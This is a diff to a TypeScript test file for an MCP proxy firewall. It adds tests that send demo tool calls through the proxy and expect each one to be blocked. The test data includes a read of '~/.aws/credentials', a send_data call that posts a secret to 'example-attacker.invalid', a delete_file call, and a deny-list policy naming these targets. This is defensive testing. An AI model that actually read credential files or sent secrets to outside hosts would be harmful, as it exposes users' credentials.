@@ -6,6 +6,7 @@
  *    (tests/fixtures/counting-server.ts). Received counts are read directly from
  *    the fixture via upstream.callTool('get_call_counts'), bypassing the proxy.
  * 3. CLI smoke: spawn src/index.ts with a temp config and read the fixture's counts file.
+ * 4. CLI with Kritish's demo/mock-server.ts as the downstream (read-only use of demo/*).
  */
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
@@ -14,6 +15,7 @@ import { Client } from '@modelcontextprotocol/client';
 import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';
 import { InMemoryTransport, SdkError, SdkErrorCode, type CallToolResult } from '@modelcontextprotocol/server';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { DUMMY_SECRET as MOCK_DUMMY_SECRET, MOCK_TOOL_NAMES, type MockToolName } from '../demo/mock-server.js';
 import {
   BLOCKED_PREFIX,
   DOWNSTREAM_ERROR_PREFIX,
@@ -698,6 +700,102 @@ describe('proxy / CLI smoke (src/index.ts)', () => {
   it('stderr never contains the dummy secret or argument values', () => {
     expect(stderr).toContain('[firewall] protecting MCP server "fixture"');
     expect(stderr).not.toContain(DUMMY_SECRET);
+    expect(stderr).not.toContain(ARG_SECRET);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// CLI with the real demo downstream: src/index.ts → demo/mock-server.ts
+// ---------------------------------------------------------------------------
+
+describe('proxy / CLI with demo/mock-server.ts', () => {
+  const mockPath = resolve(repoRoot, 'demo/mock-server.ts');
+  /** One call per mock tool; Record<MockToolName, …> fails typecheck if the mock gains a tool. */
+  const callArgs: Record<MockToolName, Record<string, unknown>> = {
+    read_project_file: { path: 'README.md' },
+    read_sensitive_file: { path: '~/.aws/credentials' },
+    send_data: { url: 'https://example-attacker.invalid/collect', data: ARG_SECRET },
+    delete_file: { path: 'README.md' },
+  };
+  let dir: string;
+  let countsFile: string;
+  let firewall: Client;
+  let direct: Client;
+  let stderr = '';
+
+  beforeAll(async () => {
+    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-mock-'));
+    countsFile = join(dir, 'counts.json');
+    const configPath = join(dir, 'firewall.yaml');
+    const config = {
+      server: {
+        id: 'demo',
+        command: process.execPath,
+        args: ['--import', 'tsx', mockPath, '--counts-file', countsFile],
+        cwd: repoRoot,
+        timeoutMs: 10_000,
+      },
+      monitor: { enabled: false },
+      // Nothing approved: all four calls must be BLOCKED with the current deny-all
+      // stub AND with a real evaluator, so this test survives Winston's merge.
+      policy: {
+        defaultDecision: 'DENY',
+        protectedPaths: ['~/.aws/credentials'],
+        deniedDestinations: ['example-attacker.invalid'],
+        approvedTools: [],
+        deniedTools: ['demo/delete_file'],
+        destinationArgs: { 'demo/send_data': ['url'] },
+      },
+    };
+    writeFileSync(configPath, JSON.stringify(config, null, 2));
+
+    const firewallTransport = new StdioClientTransport({
+      command: process.execPath,
+      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
+      cwd: repoRoot,
+      stderr: 'pipe',
+    });
+    firewallTransport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
+    firewall = new Client({ name: 'mock-cli-agent', version: '0.0.0' });
+
+    // Direct connection without --counts-file, so it cannot overwrite the firewall-side counts.
+    direct = new Client({ name: 'mock-direct', version: '0.0.0' });
+    await Promise.all([
+      firewall.connect(firewallTransport),
+      direct.connect(
+        new StdioClientTransport({ command: process.execPath, args: ['--import', 'tsx', mockPath], cwd: repoRoot, stderr: 'pipe' }),
+      ),
+    ]);
+  });
+
+  afterAll(async () => {
+    await Promise.all([firewall?.close().catch(() => {}), direct?.close().catch(() => {})]);
+    if (dir) rmSync(dir, { recursive: true, force: true });
+  });
+
+  const readCounts = (): Record<MockToolName, number> =>
+    JSON.parse(readFileSync(countsFile, 'utf8')) as Record<MockToolName, number>;
+
+  it('proxied tools/list equals the mock\'s direct listing', async () => {
+    const [proxied, listed] = await Promise.all([firewall.listTools(), direct.listTools()]);
+    expect(proxied.tools).toEqual(listed.tools);
+    for (const name of MOCK_TOOL_NAMES) expect(proxied.tools.map((t) => t.name)).toContain(name);
+  });
+
+  it('every mock tool is BLOCKED and the mock receives zero calls', async () => {
+    expect(readCounts()).toEqual(Object.fromEntries(MOCK_TOOL_NAMES.map((t) => [t, 0])));
+    for (const name of MOCK_TOOL_NAMES) {
+      const result = (await firewall.callTool({ name, arguments: callArgs[name] })) as CallToolResult;
+      expect(result.isError, name).toBe(true);
+      expect(textOf(result).startsWith(BLOCKED_PREFIX), name).toBe(true);
+      expect(metaOf(result)?.decision, name).toBe('DENY');
+    }
+    for (const name of MOCK_TOOL_NAMES) expect(readCounts()[name], name).toBe(0);
+  });
+
+  it('stderr never contains the dummy secret or argument values', () => {
+    expect(stderr).toContain('[firewall] protecting MCP server "demo"');
+    expect(stderr).not.toContain(MOCK_DUMMY_SECRET);
     expect(stderr).not.toContain(ARG_SECRET);
   });
 });
